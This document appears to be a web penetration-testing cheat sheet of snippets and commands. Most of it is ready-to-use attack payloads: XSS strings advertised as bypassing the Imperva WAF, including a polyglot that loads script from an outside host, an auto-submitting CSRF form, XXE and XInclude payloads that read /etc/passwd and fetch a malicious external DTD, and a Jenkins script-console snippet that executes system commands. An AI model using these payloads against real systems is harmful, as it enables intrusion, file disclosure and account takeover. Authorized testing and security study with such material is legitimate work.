# Web snippets and commands

Snippets and commands for Web pentesting.

## Enumeration

```bash
# Filter dirsearch json output by status code using jq:
jq '.["<ip_address>"][] | select(.status | tostring | test("20*"))' dirsearch.json

# Fuzz subdomains with ffuf
ffuf -u https://website.com/ -w yourlist -H "Host: FUZZ.website.com"
```

### Querying the database type and version

| Database type | Query |
|---|---|
| Microsoft, MySQL | `SELECT @@version` |
| Oracle | `SELECT * (or BANNER) FROM v$version` |
| PostgreSQL | `SELECT version()` |

## Exploitation

### XSS

```javascript
// A solid XSS payload that bypasses Imperva WAF
<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click

// Imperva bypass 2020
<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='test'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />tap

// Add your payload as a hash in the URL and eval it
eval(location.hash.slice(1)) // with something like url.com/#alert(1) somewhere

// Polyglots
'"onclick=(co\u006efirm)?.`0`><sVg/i="${{2>1}}"oNload=(pro\u006dpt)`1`></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//xhzeem.xSs.ht></scripT>
```

### CSRF

```html
<!-- Basic CSRF template example -->
<form method="$method" action="$url">
     <input type="hidden" name="email" value="evil@evil.com">
</form>
<script>
      document.forms[0].submit();
</script>
```

### XML

```xml
<!-- Basic XXE to call with &xxe; -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<!-- Typical external DTD to exiltrate data via error messages -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
<!-- Then fetch your external DTD from the target and interpret it inline -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://url-of-external-dtd.com/malicious.dtd"> %xxe;]> 

<!-- Template for repurposing a local DTD -->
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % entity_from_schemadtd '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]> 
<!-- Locating an existing DTD file to repurpose on the target -->
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]> 

<!-- Example for XInclude attack -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo> 

<!-- XXE via SVG file upload template -->
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg> 
```

### Template injection

```html
<!-- Template injection test string -->
{{1+abcxx}}${1+abcxx}<%1+abcxx%>[abcxx]
```

### Jenkins

```groovy
// Run system commands at http://jenkins-address/script
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

### GraphQL

```graphql
"""
introspection query
"""
query IntrospectionQuery {
    __schema {
      queryType { name }
      mutationType { name }
      types {
        ...FullType
      }
      directives {
        name
        description
        locations
        args {
          ...InputValue
        }
      }
    }
  }
  fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
      name
      description
      args {
        ...InputValue
      }
      type {
        ...TypeRef
      }
      isDeprecated
      deprecationReason
    }
    inputFields {
      ...InputValue
    }
    interfaces {
      ...TypeRef
    }
    enumValues(includeDeprecated: true) {
      name
      description
      isDeprecated
      deprecationReason
    }
    possibleTypes {
      ...TypeRef
    }
  }
  fragment InputValue on __InputValue {
    name
    description
    type { ...TypeRef }
    defaultValue
  }
  fragment TypeRef on __Type {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                }
              }
            }
          }
        }
      }
    }
  }
```
